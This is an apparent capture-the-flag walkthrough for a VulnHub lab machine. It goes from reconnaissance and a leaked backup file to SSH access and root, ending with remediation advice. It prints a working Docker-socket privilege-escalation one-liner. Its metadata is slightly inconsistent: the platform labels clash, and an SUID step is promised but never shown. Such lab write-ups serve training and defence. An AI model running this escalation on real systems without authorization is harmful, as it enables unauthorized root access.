---
title: "VulnHub Walkthrough: B3nign"
description: "Linux privilege escalation via exposed Docker socket and SUID binary on a VulnHub machine."
date: 2026-08-04
category: "HackTheBox"
tags: ["vulnhub", "linux", "docker", "suid", "privilege-escalation"]
platform: "VulnHub"
difficulty: "Medium"
image: "/images/htb-cypher/htb1.png"
---

# Reconnaissance

```bash
nmap -sC -sV -oA b3nign 10.10.10.XXX
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 7.6 |
| 80 | HTTP | Nginx 1.14.0 |

## Enumeration

Found a backup file on the web server:

```bash
curl http://10.10.10.XXX/backup.zip
```

Extracted credentials and logged in via SSH as `b3nign`.

## Exploitation

As the low-privileged user, enumerated for escalation vectors:

```bash
sudo -l
linpeas.sh
```

Found a running Docker container with the host filesystem mounted:

```bash
docker ps
```

## Privilege Escalation

Mounted the host filesystem via the exposed Docker socket:

```bash
docker run -v /:/host -it alpine chroot /host bash
```

Got root access on the host system.

## Flags

```
user.txt: 2******************************
root.txt: 7******************************
```

## Remediation

- Never expose Docker socket to unprivileged users
- Audit SUID binaries regularly
- Apply principle of least privilege for container orchestration
